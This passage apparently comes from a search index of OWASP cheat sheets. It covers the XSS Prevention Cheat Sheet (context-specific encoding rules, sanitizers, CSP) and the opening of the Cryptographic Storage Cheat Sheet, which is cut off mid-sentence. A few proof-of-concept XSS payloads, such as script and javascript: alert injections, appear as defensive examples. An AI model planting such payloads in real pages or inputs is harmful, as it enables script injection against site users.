Guide article on Testing for Cross site scripting Vulnerabilities. XSS Experimental Minimal Encoding Rules","title":"Cross Site Scripting Prevention"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#cross-site-scripting-prevention-cheat-sheet","text":"","title":"Cross Site Scripting Prevention Cheat Sheet"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#introduction","text":"This article provides a simple positive model for preventing XSS using output encoding properly. While there are a huge number of XSS attack vectors, following a few simple rules can completely defend against this serious attack. This article does not explore the technical or business impact of XSS. Suffice it to say that it can lead to an attacker gaining the ability to do anything a victim can do through their browser. Both reflected and stored XSS can be addressed by performing the appropriate validation and encoding on the server-side. DOM Based XSS can be addressed with a special subset of rules described in the DOM based XSS Prevention Cheat Sheet . For a cheatsheet on the attack vectors related to XSS, please refer to the XSS Filter Evasion Cheat Sheet . More background on browser security and the various browsers can be found in the Browser Security Handbook . Before reading this cheatsheet, it is important to have a fundamental understanding of Injection Theory .","title":"Introduction"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#a-positive-xss-prevention-model","text":"This article treats an HTML page like a template, with slots where a developer is allowed to put untrusted data. These slots cover the vast majority of the common places where a developer might want to put untrusted data. Putting untrusted data in other places in the HTML is not allowed. This is a \"whitelist\" model, that denies everything that is not specifically allowed. Given the way browsers parse HTML, each of the different types of slots has slightly different security rules. When you put untrusted data into these slots, you need to take certain steps to make sure that the data does not break out of that slot into a context that allows code execution. In a way, this approach treats an HTML document like a parameterized database query - the data is kept in specific places and is isolated from code contexts with encoding. This document sets out the most common types of slots and the rules for putting untrusted data into them safely. Based on the various specifications, known XSS vectors, and a great deal of manual testing with all the popular browsers, we have determined that the rules proposed here are safe. The slots are defined and a few examples of each are provided. Developers SHOULD NOT put data into any other slots without a very careful analysis to ensure that what they are doing is safe. Browser parsing is extremely tricky and many innocuous looking characters can be significant in the right context.","title":"A Positive XSS Prevention Model"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#why-cant-i-just-html-entity-encode-untrusted-data","text":"HTML entity encoding is okay for untrusted data that you put in the body of the HTML document, such as inside a <div> tag. It even sort of works for untrusted data that goes into attributes, particularly if you're religious about using quotes around your attributes. But HTML entity encoding doesn't work if you're putting untrusted data inside a <script> tag anywhere, or an event handler attribute like onmouseover, or inside CSS, or in a URL. So even if you use an HTML entity encoding method everywhere, you are still most likely vulnerable to XSS. You MUST use the encode syntax for the part of the HTML document you're putting untrusted data into. That's what the rules below are all about.","title":"Why Can't I Just HTML Entity Encode Untrusted Data"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#you-need-a-security-encoding-library","text":"Writing these encoders is not tremendously difficult, but there are quite a few hidden pitfalls. For example, you might be tempted to use some of the escaping shortcuts like \\\" in JavaScript. However, these values are dangerous and may be misinterpreted by the nested parsers in the browser. You might also forget to escape the escape character, which attackers can use to neutralize your attempts to be safe. OWASP recommends using a security-focused encoding library to make sure these rules are properly implemented. Microsoft provides an encoding library named the Microsoft Anti-Cross Site Scripting Library for the .NET platform and ASP.NET Framework has built-in ValidateRequest function that provides limited sanitization. The OWASP Java Encoder Project provides a high-performance encoding library for Java.","title":"You Need a Security Encoding Library"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-prevention-rules","text":"The following rules are intended to prevent all XSS in your application. While these rules do not allow absolute freedom in putting untrusted data into an HTML document, they should cover the vast majority of common use cases. You do not have to allow all the rules in your organization. Many organizations may find that allowing only Rule #1 and Rule #2 are sufficient for their needs . Please add a note to the discussion page if there is an additional context that is often required and can be secured with encoding. Do NOT simply encode/escape the list of example characters provided in the various rules. It is NOT sufficient to encode/escape only that list. Blacklist approaches are quite fragile. The whitelist rules here have been carefully designed to provide protection even against future vulnerabilities introduced by browser changes.","title":"XSS Prevention Rules"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-0-never-insert-untrusted-data-except-in-allowed-locations","text":"The first rule is to deny all - don't put untrusted data into your HTML document unless it is within one of the slots defined in Rule #1 through Rule #5. The reason for Rule #0 is that there are so many strange contexts within HTML that the list of encoding rules gets very complicated. We can't think of any good reason to put untrusted data in these contexts. This includes \"nested contexts\" like a URL inside a JavaScript -- the encoding rules for those locations are tricky and dangerous. If you insist on putting untrusted data into nested contexts, please do a lot of cross-browser testing and let us know what you find out. Directly in a script: < script >... NEVER PUT UNTRUSTED DATA HERE ...</ script > Inside an HTML comment: <!--...NEVER PUT UNTRUSTED DATA HERE...--> In an attribute name: < div ... NEVER PUT UNTRUSTED DATA HERE ...= test /> In a tag name: < NEVER PUT UNTRUSTED DATA HERE ... href = \"/test\" /> Directly in CSS: < style > .. . NEVER PUT UNTRUSTED DATA HERE ... </ style > Most importantly, never accept actual JavaScript code from an untrusted source and then run it. For example, a parameter named \"callback\" that contains a JavaScript code snippet. No amount of encoding/escaping can fix that.","title":"RULE #0 - Never Insert Untrusted Data Except in Allowed Locations"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-1-html-encode-before-inserting-untrusted-data-into-html-element-content","text":"Rule #1 is for when you want to put untrusted data directly into the HTML body somewhere. This includes inside normal tags like div , p , b , td , etc. Most web frameworks have a method for HTML encoding/escaping for the characters detailed below. However, this is absolutely not sufficient for other HTML contexts. You need to implement the other rules detailed here as well. < body > ...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE... </ body > < div > ...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE... </ div > Encode the following characters with HTML entity encoding to prevent switching into any execution context, such as script, style, or event handlers. Using hex entities is recommended in the spec. The 5 characters significant in XML ( & , < , > , \" , ' ): & --> &amp; < --> &lt; > --> &gt; \" --> &quot; ' --> &#x27; &apos; not recommended because its not in the HTML spec (See: section 24.4.1) &apos; is in the XML and XHTML specs.","title":"RULE #1 - HTML Encode Before Inserting Untrusted Data into HTML Element Content"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-2-attribute-encode-before-inserting-untrusted-data-into-html-common-attributes","text":"Rule #2 is for putting untrusted data into typical attribute values like width , name , value , etc. This should not be used for complex attributes like href , src , style , or any of the event handlers like onmouseover. It is extremely important that event handler attributes should follow Rule #3 for HTML JavaScript Data Values. Inside UNquoted attribute: < div attr = ...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE ... > content Inside single quoted attribute: < div attr = '...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...' > content Inside double quoted attribute : < div attr = \"...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...\" > content Except for alphanumeric characters, encode all characters with ASCII values less than 256 with the \"&#xHH;\" format (or a named entity if available) to prevent switching out of the attribute. The reason this rule is so broad is that developers frequently leave attributes unquoted. Properly quoted attributes can only be escaped with the corresponding quote. Unquoted attributes can be broken out of with many characters, including [space] % * + , - / ; < = > ^ and | .","title":"RULE #2 - Attribute Encode Before Inserting Untrusted Data into HTML Common Attributes"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-3-javascript-encode-before-inserting-untrusted-data-into-javascript-data-values","text":"Rule #3 concerns dynamically generated JavaScript code - both script blocks and event-handler attributes. The only safe place to put untrusted data into this code is inside a quoted \"data value.\" Including untrusted data inside any other JavaScript context is quite dangerous, as it is extremely easy to switch into an execution context with characters including (but not limited to) semi-colon, equals, space, plus, and many more, so use with caution. Inside a quoted string: < script > alert ( '...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...' )</ script > One side of a quoted expression: < script > x = '...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...' </ script > Inside quoted event handler: < div onmouseover = \"x='...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...'\" </ div > Please note there are some JavaScript functions that can never safely use untrusted data as input - EVEN IF JAVASCRIPT ENCODED! For example: < script > window . setInterval ( '...EVEN IF YOU ENCODE UNTRUSTED DATA YOU ARE XSSED HERE...' ); </ script > Except for alphanumeric characters, encode all characters less than 256 with the \\xHH format to prevent switching out of the data value into the script context or into another attribute. DO NOT use any escaping shortcuts like \\\" because the quote character may be matched by the HTML attribute parser which runs first. These escaping shortcuts are also susceptible to escape-the-escape attacks where the attacker sends \\\" and the vulnerable code turns that into \\\\\" which enables the quote. If an event handler is properly quoted, breaking out requires the corresponding quote. However, we have intentionally made this rule quite broad because event handler attributes are often left unquoted. Unquoted attributes can be broken out of with many characters including [space] % * + , - / ; < = > ^ and | . Also, a </script> closing tag will close a script block even though it is inside a quoted string because the HTML parser runs before the JavaScript parser. Please note this is an aggressive encoding policy that over-encodes. If there is a guarantee that proper quoting is accomplished then a much smaller character set is needed. Please look at the OWASP Java Encoder JavaScript encoding examples for examples of proper JavaScript use that requires minimal encoding.","title":"RULE #3 - JavaScript Encode Before Inserting Untrusted Data into JavaScript Data Values"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-31-html-encode-json-values-in-an-html-context-and-read-the-data-with-jsonparse","text":"In a Web 2.0 world, the need for having data dynamically generated by an application in a JavaScript context is common. One strategy is to make an AJAX call to get the values, but this isn't always performant. Often, an initial block of JSON is loaded into the page to act as a single place to store multiple values. This data is tricky, though not impossible, to encode/escape correctly without breaking the format and content of the values. Ensure returned Content-Type header is application/json and not text/html . This shall instruct the browser not misunderstand the context and execute injected script Bad HTTP response: HTTP/1.1 200 Date: Wed, 06 Feb 2013 10:28:54 GMT Server: Microsoft-IIS/7.5.... Content-Type: text/html; charset=utf-8 <-- bad .... Content-Length: 373 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive {\"Message\":\"No HTTP resource was found that matches the request URI 'dev.net.ie/api/pay/.html?HouseNumber=9&AddressLine =The+Gardens<script>alert(1)</script>&AddressLine2=foxlodge+woods&TownName=Meath'.\",\"MessageDetail\":\"No type was found that matches the controller named 'pay'.\"} <-- this script will pop!! Good HTTP response: HTTP/1.1 200 Date: Wed, 06 Feb 2013 10:28:54 GMT Server: Microsoft-IIS/7.5.... Content-Type: application/json; charset=utf-8 <--good ..... A common anti-pattern one would see: < script > // Do NOT do this without encoding the data with one of the techniques listed below. var initData = <%= data . to_json %> ; </ script >","title":"RULE #3.1 - HTML Encode JSON values in an HTML context and read the data with JSON.parse"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#json-serialization","text":"A safe JSON serializer will allow developers to serialize JSON as string of literal JavaScript which can be embedded in an HTML in the contents of the <script> tag. HTML characters and JavaScript line terminators need be encoded. Consider the Yahoo JavaScript Serializer for this task.","title":"JSON serialization"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-entity-encoding","text":"This technique has the advantage that HTML entity encoding is widely supported and helps separate data from server side code without crossing any context boundaries. Consider placing the JSON block on the page as a normal element and then parsing the innerHTML to get the contents. The JavaScript that reads the span can live in an external file, thus making the implementation of CSP enforcement easier. < div id = \"init_data\" style = \"display: none\" > < %= html_encode(data.to_json) %> </ div > // external js file var dataElement = document . getElementById ( 'init_data' ); // decode and parse the content of the div var initData = JSON . parse ( dataElement . textContent ); An alternative to encoding and decoding JSON directly in JavaScript, is to normalize JSON server-side by converting < to \\u003c before delivering it to the browser.","title":"HTML entity encoding"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-4-css-encode-and-strictly-validate-before-inserting-untrusted-data-into-html-style-property-values","text":"Rule #4 is for when you want to put untrusted data into a style sheet or a style tag. CSS is surprisingly powerful, and can be used for numerous attacks. Therefore, it's important that you only use untrusted data in a property value and not into other places in style data. You should stay away from putting untrusted data into complex properties like url , behavior , and custom ( -moz-binding ). You should also not put untrusted data into IE's expression property value which allows JavaScript. Property value: < style > selector { property : ... ENCODE UNTRUSTED DATA BEFORE PUTTING HERE ... ; } </ style > < style > selector { property : \"...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...\" ; } </ style > < span style = \"property : ...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...\" > text </ span > Please note there are some CSS contexts that can never safely use untrusted data as input - EVEN IF PROPERLY CSS ENCODED! You will have to ensure that URLs only start with http not javascript and that properties never start with \"expression\". For example: { background-url : \"javascript:alert(1)\" ; } // and all other URLs { text-size : \"expression(alert('XSS'))\" ; } // only in IE Except for alphanumeric characters, encode all characters with ASCII values less than 256 with the \\HH encoding format. DO NOT use any escaping shortcuts like \\\" because the quote character may be matched by the HTML attribute parser which runs first. These escaping shortcuts are also susceptible to escape-the-escape attacks where the attacker sends \\\" and the vulnerable code turns that into \\\\\" which enables the quote. If attribute is quoted, breaking out requires the corresponding quote. All attributes should be quoted but your encoding should be strong enough to prevent XSS when untrusted data is placed in unquoted contexts. Unquoted attributes can be broken out of with many characters including [space] % * + , - / ; < = > ^ and | . Also, the </style> tag will close the style block even though it is inside a quoted string because the HTML parser runs before the JavaScript parser. Please note that we recommend aggressive CSS encoding and validation to prevent XSS attacks for both quoted and unquoted attributes.","title":"RULE #4 - CSS Encode And Strictly Validate Before Inserting Untrusted Data into HTML Style Property Values"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-5-url-encode-before-inserting-untrusted-data-into-html-url-parameter-values","text":"Rule #5 is for when you want to put untrusted data into HTTP GET parameter value. < a href = \"http://www.somesite.com?test=...ENCODE UNTRUSTED DATA BEFORE PUTTING HERE...\" > link </ a > Except for alphanumeric characters, encode all characters with ASCII values less than 256 with the %HH encoding format. Including untrusted data in data: URLs should not be allowed as there is no good way to disable attacks with encoding/escaping to prevent switching out of the URL. All attributes should be quoted. Unquoted attributes can be broken out of with many characters including [space] % * + , - / ; < = > ^ and | . Note that entity encoding is useless in this context. WARNING: Do not encode complete or relative URLs with URL encoding! If untrusted input is meant to be placed into href , src or other URL-based attributes, it should be validated to make sure it does not point to an unexpected protocol, especially javascript links. URLs should then be encoded based on the context of display like any other piece of data. For example, user driven URLs in HREF links should be attribute encoded. For example: String userURL = request . getParameter ( \"userURL\" ) boolean isValidURL = Validator . IsValidURL ( userURL , 255 ); if ( isValidURL ) { < a href = \"<%=encoder.encodeForHTMLAttribute(userURL)%>\" > link </ a > }","title":"RULE #5 - URL Encode Before Inserting Untrusted Data into HTML URL Parameter Values"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-6-sanitize-html-markup-with-a-library-designed-for-the-job","text":"If your application handles markup -- untrusted input that is supposed to contain HTML -- it can be very difficult to validate. Encoding is also difficult, since it would break all the tags that are supposed to be in the input. Therefore, you need a library that can parse and clean HTML formatted text. There are several available at OWASP that are simple to use: HtmlSanitizer An open-source .Net library. The HTML is cleaned with a white list approach. All allowed tags and attributes can be configured. The library is unit tested with the OWASP XSS Filter Evasion Cheat Sheet var sanitizer = new HtmlSanitizer (); sanitizer . AllowedAttributes . Add ( \"class\" ); var sanitized = sanitizer . Sanitize ( html ); OWASP Java HTML Sanitizer import org.owasp.html.Sanitizers ; import org.owasp.html.PolicyFactory ; PolicyFactory sanitizer = Sanitizers . FORMATTING . and ( Sanitizers . BLOCKS ); String cleanResults = sanitizer . sanitize ( \"<p>Hello, <b>World!</b>\" ); For more information on OWASP Java HTML Sanitizer policy construction, see here . Ruby on Rails SanitizeHelper The SanitizeHelper module provides a set of methods for scrubbing text of undesired HTML elements. <%= sanitize @comment . body , tags : %w(strong em a) , attributes : %w(href) %> Other libraries that provide HTML Sanitization include: HTML sanitizer from Google Closure Library (JavaScript/Node.js, docs ) DOMPurify (JavaScript, requires jsdom for Node.js) PHP HTML Purifier Python Bleach","title":"RULE #6 - Sanitize HTML Markup with a Library Designed for the Job"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-7-avoid-javascript-urls","text":"Untrusted URLs that include the protocol javascript: will execute JavaScript code when used in URL DOM locations such as anchor tag HREF attributes or iFrame src locations. Be sure to validate all untrusted URLs to ensure they only contain safe schemes such as HTTPS.","title":"RULE #7 - Avoid JavaScript URLs"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#rule-8-prevent-dom-based-xss","text":"For details on what DOM-based XSS is, and defenses against this type of XSS flaw, please see the OWASP article on DOM based XSS Prevention Cheat Sheet .","title":"RULE #8 - Prevent DOM-based XSS"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#bonus-rule-1-use-httponly-cookie-flag","text":"Preventing all XSS flaws in an application is hard, as you can see. To help mitigate the impact of an XSS flaw on your site, OWASP also recommends you set the HTTPOnly flag on your session cookie and any custom cookies you have that are not accessed by any JavaScript you wrote. This cookie flag is typically on by default in .NET apps, but in other languages you have to set it manually. For more details on the HTTPOnly cookie flag, including what it does, and how to use it, see the OWASP article on HTTPOnly .","title":"Bonus Rule #1: Use HTTPOnly cookie flag"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#bonus-rule-2-implement-content-security-policy","text":"There is another good complex solution to mitigate the impact of an XSS flaw called Content Security Policy. It's a browser side mechanism which allows you to create source whitelists for client side resources of your web application, e.g. JavaScript, CSS, images, etc. CSP via special HTTP header instructs the browser to only execute or render resources from those sources. For example this CSP: Content-Security-Policy: default-src: 'self'; script-src: 'self' static.domain.tld Will instruct web browser to load all resources only from the page's origin and JavaScript source code files additionally from static.domain.tld . For more details on Content Security Policy, including what it does, and how to use it, see this article on Content Security Policy .","title":"Bonus Rule #2: Implement Content Security Policy"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#bonus-rule-3-use-an-auto-escaping-template-system","text":"Many web application frameworks provide automatic contextual escaping functionality such as AngularJS strict contextual escaping and Go Templates . Use these technologies when you can.","title":"Bonus Rule #3: Use an Auto-Escaping Template System"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#bonus-rule-4-properly-use-modern-js-frameworks","text":"Modern JavaScript frameworks have pretty good XSS protection built in. Usually framework API allows bypassing that protection in order to render unescaped HTML or include executable code. The following API methods and props in the table below are considered dangerous and by using them you are potentially exposing your users to an XSS vulnerability. If you really have to use them remember that now all the data must be sanitized by yourself. JavaScript framework Dangerous methods / props Angular (2+) bypassSecurityTrust React dangerouslySetInnerHTML Svelte {@html ...} Vue (2+) v-html Avoid template injection in Angular by building with --prod parameter ( ng build --prod ). Also remember to keep your framework updated to the latest version with all possible bugfixes.","title":"Bonus Rule #4: Properly use modern JS frameworks"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#x-xss-protection-header","text":"The X-XSS-Protection header has been deprecated by modern browsers and its use can introduce additional security issues on the client side. As such, it is recommended to set the header as X-XSS-Protection: 0 in order to disable the XSS Auditor, and not allow it to take the default behavior of the browser handling the response. Check the below references for a better understanding on this topic: Google Chrome\u2019s XSS Auditor goes back to filter mode Chrome removed the XSS Auditor Firefox does not implement the XSSAuditor Edge retired their XSS filter OWASP ZAP deprecated the scan for the header SecurityHeaders.com no longer scans for the header","title":"X-XSS-Protection Header"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#xss-prevention-rules-summary","text":"Data Type Context Code Sample Defense String HTML Body <span>UNTRUSTED DATA </span> HTML Entity Encoding (rule #1). String Safe HTML Attributes <input type=\"text\" name=\"fname\" value=\"UNTRUSTED DATA \"> Aggressive HTML Entity Encoding (rule #2), Only place untrusted data into a whitelist of safe attributes (listed below), Strictly validate unsafe attributes such as background, ID and name. String GET Parameter <a href=\"/site/search?value=UNTRUSTED DATA \">clickme</a> URL Encoding (rule #5). String Untrusted URL in a SRC or HREF attribute <a href=\"UNTRUSTED URL \">clickme</a> <iframe src=\"UNTRUSTED URL \" /> Canonicalize input, URL Validation, Safe URL verification, Whitelist http and HTTPS URLs only (Avoid the JavaScript Protocol to Open a new Window), Attribute encoder. String CSS Value html <div style=\"width: UNTRUSTED DATA ;\">Selection</div> Strict structural validation (rule #4), CSS Hex encoding, Good design of CSS Features. String JavaScript Variable <script>var currentValue='UNTRUSTED DATA ';</script> <script>someFunction('UNTRUSTED DATA ');</script> Ensure JavaScript variables are quoted, JavaScript Hex Encoding, JavaScript Unicode Encoding, Avoid backslash encoding ( \\\" or \\' or \\\\ ). HTML HTML Body <div>UNTRUSTED HTML</div> HTML Validation (JSoup, AntiSamy, HTML Sanitizer...). String DOM XSS <script>document.write(\"UNTRUSTED INPUT: \" + document.location.hash );<script/> DOM based XSS Prevention Cheat Sheet The following snippets of HTML demonstrate how to safely render untrusted data in a variety of different contexts. Safe HTML Attributes include: align , alink , alt , bgcolor , border , cellpadding , cellspacing , class , color , cols , colspan , coords , dir , face , height , hspace , ismap , lang , marginheight , marginwidth , multiple , nohref , noresize , noshade , nowrap , ref , rel , rev , rows , rowspan , scrolling , shape , span , summary , tabindex , title , usemap , valign , value , vlink , vspace , width .","title":"XSS Prevention Rules Summary"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#output-encoding-rules-summary","text":"The purpose of output encoding (as it relates to Cross Site Scripting) is to convert untrusted input into a safe form where the input is displayed as data to the user without executing as code in the browser. The following charts details a list of critical output encoding methods needed to stop Cross Site Scripting. Encoding Type Encoding Mechanism HTML Entity Encoding Convert & to &amp; , Convert < to &lt; , Convert > to &gt; , Convert \" to &quot; , Convert ' to &#x27; , Convert / to &#x2F; HTML Attribute Encoding Except for alphanumeric characters, encode all characters with the HTML Entity &#xHH; format, including spaces. ( HH = Hex Value) URL Encoding Standard percent encoding, see here . URL encoding should only be used to encode parameter values, not the entire URL or path fragments of a URL. JavaScript Encoding Except for alphanumeric characters, encode all characters with the \\uXXXX unicode encoding format ( X = Integer). CSS Hex Encoding CSS encoding supports \\XX and \\XXXXXX . Using a two character encode can cause problems if the next character continues the encode sequence. There are two solutions (a) Add a space after the CSS encode (will be ignored by the CSS parser) (b) use the full amount of CSS encoding possible by zero padding the value.","title":"Output Encoding Rules Summary"},{"location":"cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#related-articles","text":"XSS Attack Cheat Sheet: The following article describes how to exploit different kinds of XSS Vulnerabilities that this article was created to help you avoid: OWASP: XSS Filter Evasion Cheat Sheet . Description of XSS Vulnerabilities: OWASP article on XSS Vulnerabilities. Discussion on the Types of XSS Vulnerabilities: Types of Cross-Site Scripting . How to Review Code for Cross-site scripting Vulnerabilities: OWASP Code Review Guide article on Reviewing Code for Cross-site scripting Vulnerabilities. How to Test for Cross-site scripting Vulnerabilities: OWASP Testing Guide article on Testing for Cross site scripting Vulnerabilities. XSS Experimental Minimal Encoding Rules","title":"Related Articles"},{"location":"cheatsheets/Cryptographic_Storage_Cheat_Sheet.html","text":"Cryptographic Storage Cheat Sheet \u00b6 Introduction \u00b6 This article provides a simple model to follow when implementing solutions to protect data at rest. Passwords should not be stored using reversible encryption - secure password hashing algorithms should be used instead. The Password Storage Cheat Sheet contains further guidance on storing passwords. Architectural Design \u00b6 The first step in designing any application is to consider the overall architecture of the system, as this will have a huge impact on the technical implementation. This process should begin with considering the threat model of the application (i.e, who you trying to protect that data against). The use of dedicated secret or key management systems can provide an additional layer of security protection, as well as making the management of secrets significantly easier - however it comes at the cost of additional complexity and administrative overhead - so may not be feasible for all applications. Note that many cloud environments provide these services, so these should be taken advantage of where possible. Where to Perform Encryption \u00b6 Encryption can be performed on a number of levels in the application stack, such as: At the application level. At the database level (e.g, SQL Server TDE ) At the filesystem level (e.g, BitLocker or LUKS) At the hardware level (e.g, encrypted RAID cards or SSDs) Which layer(s) are most appropriate will depend on the threat model. For example, hardware level encryption is effective at protecting against the physical theft of the server, but will provide no protection if an attacker is able to compromise the server remotely. Minimise the Storage of Sensitive Information \u00b6 The best way to protect sensitive information is to not store it in the first place. Although this applies to all kinds of information, it is most often applicable to credit card details, as they are highly desirable for attackers, and PCI DSS has such stringent requirements for how they must be stored. Wherever possible, the storage of sensitive information should be avoided. Algorithms \u00b6 For symmetric encryption AES with a key that's at least 128 bits (ideally 256 bits ) and a secure mode should be used as the preferred algorithm. For asymmetric encryption, use elliptical curve cryptography (ECC) with a secure curve such as Curve25519 as a preferred algorithm. If ECC is not available and RSA must be used, then ensure that the key is at least 2048 bits . Many other symmetric and asymmetric algorithms are available which have their own pros and cons, and they may be better or worse than AES or Curve25519 in specific use cases. When considering these, a number of factors should be taken into account, including: Key size. Known attacks and weaknesses of the algorithm. Maturity of the algorithm. Approval by third parties such as NIST's algorithmic validation program . Performance (both for encryption and decryption). Quality of the libraries available. Portability of the algorithm (i.e, how widely supported is it). In some cases there may be regulatory requirements that limit the algorithms that can be used, such as FIPS 140-2 or PCI DSS . Custom Algorithms \u00b6 Don't do this. Cipher Modes \u00b6 There are various modes that can be used to allow block ciphers (such as AES) to encrypt arbitrary amounts of data, in the same way that a stream cipher would. These modes have different security and performance characteristics, and a full discussion of them is outside the scope of this cheat sheet. Some of the modes have requirements to generate secure initialisation vectors (IVs) and other attributes, but these should be handled automatically by the library. Where available, authenticated modes should always be used. These provide guarantees of the integrity and authenticity of the data, as well as confidentiality. The most commonly used authenticated modes are GCM and CCM , which should be used as a first preference. If GCM or CCM are not available, then CTR mode or CBC mode should be used. As these do not provide any guarantees about the authenticity of the data, separate authentication should be implemented, such as using the Encrypt-then-MAC technique. Care needs to be taken when using this method with variable length messages If random access to the encrypted data is required then XTS mode should be used. This is typically used for disk encryption, so it unlikely to be used by a web application. ECB should not be used outside of very specific circumstances. Secure Random Number Generation \u00b6 Random numbers (or strings) are needed for various security critical functionality, such as generating encryption keys, IVs, session IDs, CSRF tokens or password reset tokens. As such, it is important that these are generated securely, and that it is not possible for an attacker to guess and predict them. It is generally not possible for computers to generate truly random numbers (without special hardware), so most systems and languages provide two different types of randomness. Pseudo-Random Number Generators (PRNG) provide low-quality randomness that are much faster, and can be used for non-security related functionality (such as ordering results on a page, or randomising UI elements). However, they must not be used for anything security critical, as it is often possible for attackers to guess or predict the output. Cryptographically Secure Pseudo-Random Number Generators (CSPRNG) are designed to produce a much higher quality of randomness (more strictly, a greater amount of entropy), making them safe to use for security-sensitive functionality. However, they are slower and more CPU intensive, can end up blocking in some circumstances when large amounts of random data are requested. As such, if large amounts of non-security related randomness are needed, they may not be appropriate. The table below shows the recommended algorithms for each language, as well as insecure functions that should not be used. Language Unsafe Functions Cryptographically Secure Functions C random() , rand() getrandom(2) Java java.util.Random() java.security.SecureRandom PHP rand() , mt_rand() , array_rand() , uniqid() random_bytes() , random_int() in PHP 7 or openssl_random_pseudo_bytes() in PHP 5 .NET/C# Random() RNGCryptoServiceProvider Objective-C arc4random() (Uses RC4 Cipher) SecRandomCopyBytes Python random() secrets() Ruby Random SecureRandom Go rand using math/rand package crypto.rand package Rust rand::prng::XorShiftRng rand::prng::chacha::ChaChaRng and the rest of the Rust library CSPRNGs. UUIDs and GUIDs \u00b6 Universally unique identifiers (UUIDs or GUIDs) are sometimes used as a quick way to generate random strings. Although they can provide a reasonable source of randomness, this will depend on the type or version of the UUID that is created. Specifically, version 1 UUIDs are comprised of a high precision timestamp and the MAC address of the system that generated them, so are not random (although they may be hard to guess, given the timestamp is to the nearest 100ns). Type 4 UUIDs are randomly generated, although whether this is done using a CSPRNG will depend on the implementation. Unless this is known to be secure in the specific language or framework, the randomness of UUIDs should not be relied upon. Defence in Depth \u00b6 Applications should be designed to still be secure even if cryptographic controls fail. Any information that is stored in an encrypted form should also be protected by additional layers of security. Application should also not rely on the security of encrypted URL parameters, and should enforce strong access control to prevent unauthorised access to information. Key Management \u00b6 Processes \u00b6 Formal processes should be implemented (and tested) to cover all aspects of key management, including: Generating and storing new keys. Distributing keys to the required parties. Deploying keys to application servers. Rotating and decommissioning old keys Key Generation \u00b6 Keys should be randomly generated using a cryptographically secure function, such as those discussed in the Secure Random Number Generation section. Keys should not be based on common words or phrases, or on \"random\" characters generated by mashing the keyboard. Where multiple keys are used (such as data separate data-encrypting and key-encrypting keys), they should be fully independent from each other. Key Lifetimes and Rotation \u00b6 Encryption keys should be changed (or rotated) based on a number of different criteria: If the previous key is known (or suspected) to have been compromised. This could also be caused by a someone who had access to the key leaving the organisation. After a specified period of time has elapsed (known as the cryptoperiod). There are many factors that could affect what an appropriate cryptoperiod is, including the size of the key, the sensitivity of the data, and the threat model of the system. See section 5.3 of NIST SP 800-57 for further guidance. After the key has been used to encrypt a specific amount of data. This would typically be 2^35 bytes (~34GB) for 64-bit keys and 2^68 bytes (~295 exabytes) for 128 bit keys. If there is a significant change to the security provided by the algorithm (such as a new attack being announced). Once one of these criteria have been met, a new key should be generated and used for encrypting any new data. There are two main approaches for how existing data that was encrypted with the old key(s) should be handled: Decrypting it and re-encrypting it with the new key. Marking each item with the ID of the key that was used to encrypt it, and storing multiple keys to allow the old data to be decrypted. The first option should generally be preferred, as it greatly simplifies both the application code and key management processes; however, it may not always be feasible. Note that old keys should generally be stored for a certain period after they have been retired, in case old backups of copies of the data need to be decrypted. It is important that the code and processes required to rotate a key are in place before they are required, so that keys can be quickly rotated in the event of a compromise. Additionally, processes should also be implemented to allow the encryption algorithm or library to be changed, in case a new vulnerability is found in the algorithm or implementation. Key Storage \u00b6 Securely storing cryptographic keys is one of the hardest problems to solve, as the application always needs to have some level of access to the keys in order to decrypt the data. While it may not be possible to fully protect the keys from an attacker who has fully compromised the application, a number of steps can be taken to make it harder for them to obtain the keys. Where available, the secure storage mechanisms provided by the operating system, framework or cloud service provider should be used. These include: A physical Hardware Security Module (HSM). A virtual HSM. Key vaults such as Amazon KMS or Azure Key Vault . Secure storage APIs provided by the ProtectedData class in the .NET framework. There are many advantages to using these types of secure storage over simply putting keys in configuration files. The specifics of these will vary depending on the solution used, but they include: Central management of keys, especially in 